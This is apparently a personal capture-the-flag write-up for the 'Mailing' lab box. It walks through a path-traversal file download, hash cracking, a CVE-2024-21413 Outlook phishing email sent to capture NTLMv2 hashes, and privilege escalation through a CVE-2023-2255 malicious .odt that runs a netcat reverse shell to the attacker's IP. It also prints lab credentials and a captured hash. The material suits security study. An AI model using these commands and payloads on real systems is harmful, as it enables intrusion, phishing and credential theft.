---
Status: In progress
OS: Linux
Difficulty: Easy
tags:
  - ScheduledTask
  - Mail
Date: 2026-06-23T02:06:00
Owned: 2026-06-25T00:21:00
---

---

# Enumeration
## port scan

run rustscan  
```sh
rustscan -a 10.129.232.39 -ulimit 5000 | tee rust.txt
```
![[Pasted image 20260623020821.png]]

many ports are open let's check the http on port 80 first  

![[Pasted image 20260623021012.png]]

The site is running Mail Server using hMailServer as shown  

checking for exploit  
![[Pasted image 20260623021338.png]]
to run this exploit we need to have the admin path first  
![[Pasted image 20260623021426.png]]
## dir enum

run feroxbuster  
```sh
feroxbuster -u http://mailing.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -o ferox80.txt

```
found nothing useful  
![[Pasted image 20260623022038.png]]
nothing really interesting, also run with larger wordlist dirb-2.3-med  

# SMB
try both guest and anonymous  
![[Pasted image 20260623022512.png]]
# Exploit

Viewing the source code we might be able to download file if we know it's name and path.  
![[Pasted image 20260624004840.png]]
from the exploit earlier it use ?page= let's try with ?file=  
(x86) need to be added, could check from forum  
```
http://mailing.htb/download.php?file=../../Program+Files+(x86)/hmailserver/Bin/hmailserver.ini%00
```
got the .ini downloaded  
![[Pasted image 20260624010221.png]]
There is password visible
let's crack the hash
```
nth -t 841bb5acfa6779ae432fd7a4e6600ba7
```
![[Pasted image 20260624223745.png]]
use hashcat mode 0  
```
hashcat -m 0 841bb5acfa6779ae432fd7a4e6600ba7 /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20260624223715.png]]  

let's try to connect using smb  
![[Pasted image 20260624224417.png]]
what about winrm  
![[Pasted image 20260624224525.png]]
doesn't work either

Given that this credential came from hMailServer, it seems likely that it’ll work for logging into SMTP to send mail.

I can use `swaks` (command line mail sender, `apt install swaks`) with the `--auth` flags and `--quit-after` to avoid actually sending any mail
```sh
swaks --auth-user 'administrator@mailing.htb' --auth LOGIN --auth-password homenetworkingadministrator --quit-after AUTH --server mailing.htb
```
![[Pasted image 20260624225110.png]]
the password is valid  
![[Pasted image 20260624225247.png]]

This is the hard part finding the CVE  
I'm just gonna follow writeup it use this CVE https://nvd.nist.gov/vuln/detail/CVE-2024-21413

This work for both Outlook and Window mail  
Imma just paste this from 0xdf
Background

Outlook (and Windows Mail) has different security behaviors that it puts in place for different protocols of links that come in via email. One of the more restrictive is `file://` protocol. Researchers found that if the URL ends with “![anything]”, then that security is dropped, and the link will be processed without additional security. This means that an attacker can send one of these links, and when clicked (or sometimes opened in the preview pane), it will try to authenticate to the attacker’s SMB server, allowing the attacker to capture NetNTLMv2 hashes and potentially crack that user’s password.

POCs of this exploit will send an HTML body that looks like:

```
<html>
    <body>
        <img src="{base64_image_string}" alt="Image"><br />
        <h1><a href="file:///{link_url}!poc">CVE-2024-21413 PoC.</a></h1>
    </body>
    </html>
```

Just by having this link open in the preview window, Windows Mail will try to load `{link_url}` over SMB.

for the exploit we can use this https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability

![[Pasted image 20260624230101.png]]
To run this 
```sh
python CVE-2024-21413.py --server "<SMTP server>" --port <SMTP port> --username "<SMTP username>" --password "<SMTP password>" --sender "<sender email>" --recipient "<recipient email>" --url "<link URL>" --subject "<email subject>"
```
put in the field needed  

from instruction we downloaded we can find emails  
`maya@mailing.htb` `ruy@mailing.htb` `gregory@mailing.htb`.  

```sh
python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender test@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.223\share\sploit" --subject "Check this out ASAP!"
```
email sent  
![[Pasted image 20260624230758.png]]
we have to set up responder to capture the authenticate attempt  
```sh
sudo responder -I tun0
```
![[Pasted image 20260624230904.png]]

SMTP server is listening we need to wait for user to click on the link

after a few minutes we captured maya's hash  
![[Pasted image 20260624231106.png]]
```NTLM
maya::MAILING:e7a476454a4b424a:CC6598A0A2DC5828EDE61B42EDADC9D6:010100000000000000B17A362E04DD0122F58D9316A2E4CB000000000200080034004D005A00340001001E00570049004E002D00500057004B004600520053003400520032004800560004003400570049004E002D00500057004B00460052005300340052003200480056002E0034004D005A0034002E004C004F00430041004C000300140034004D005A0034002E004C004F00430041004C000500140034004D005A0034002E004C004F00430041004C000700080000B17A362E04DD0106000400020000000800300030000000000000000000000000200000D887BAB4D7CAE6AE7DFD0595A7332366D8F120EF2B5B76A05ED80E1254C11CC60A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200320033000000000000000000
```
I know it's already shows that the hash is NTLMv2 but this is just easier to get hashcat mode  
![[Pasted image 20260624231255.png]]
5600 it is  
```sh
hashcat -m 5600 maya.hash /usr/share/wordlists/rockyou.txt
```
cracked!  
![[Pasted image 20260624231350.png]]
got the cred maya:m4y4ngs4ri  
let's check where we can use this  
![[Pasted image 20260624231524.png]]
pwned using winrm  
to get the shell we gonna use evil-winrm
```sh
evil-winrm -i 10.129.232.39 -u maya -p m4y4ngs4ri
```
got the shell  
![[Pasted image 20260624231617.png]]
get the user flag on Desktop  
![[Pasted image 20260624231715.png]]

# Priv Escalation
checking priv  
```powershell
whoami /priv
```

![[Pasted image 20260624231815.png]]
no SeImpersonate  
no SeBackup..  

getting some info  
![[Pasted image 20260624231950.png]]

get the PS history path  
![[Pasted image 20260624232355.png]]
check the file  
save nothing D:  
![[Pasted image 20260624232415.png]]

let's go through the files  
![[Pasted image 20260624232605.png]]

Important Doc? sound interesting  
yup nothing  
![[Pasted image 20260624232642.png]]

gotta check all the files  
let's see the program files installed  
![[Pasted image 20260624233229.png]]

libreoffice is not a standard program  
![[Pasted image 20260624233521.png]]
the product version is 7.4.0.1  

searching google with the product version follow with exploit lead me to this github exploit  
https://github.com/elweth-sec/CVE-2023-2255

generate the .odt file
```sh
python3 CVE-2023-2255.py --cmd 'cmd.exe /c C:\ProgramData\nc.exe -e cmd.exe 10.10.14.223 443' --output exploit.odt
```
![[Pasted image 20260625000106.png]]
upload the exploit to target using smb  
```
smbng -H 10.129.232.39 -u maya -p m4y4ngs4ri
```
![[Pasted image 20260624234946.png]]
also nc.exe  
![[Pasted image 20260624235827.png]]
move nc.exe to C:\ProgramData
![[Pasted image 20260624235904.png]]
got the revshells as localadmin  

![[Pasted image 20260625000435.png]]

# Messing around 
The reason .odt got run is there is script run by localadmin to clean up the important file folders
to confirm my hypothesis  
checking for task scheduled to run as localadmin
```powershell
schtasks /query /fo CSV /v | ConvertFrom-Csv | Where-Object { $_."Run As User" -like "*localadmin*" }
```
![[Pasted image 20260625001032.png]]
it calls a script here `C:\Users\localadmin\Documents\scripts\soffice.ps1`
can't read as maya  
![[Pasted image 20260625001139.png]]
but I got root anyways :D  
here is the script content  
![[Pasted image 20260625001251.png]]

so the script just make sure it open the document with .odt then delete it  
that's it  

To summary for this lab, Since we can't check the script we would need to guesstimate from the folder cleanup and the behavior that it keep removing file in C:\Important Documents  

# Lesson Learned

If the credential can't be use on any port, check for service that we got the cred from. For this box we got the cred from hmailserver.ini which is a mailserver.  

After got low priv account make sure to check thoroughly through file from C:\\  
In Program files look for unusual program check it version look for exploit.  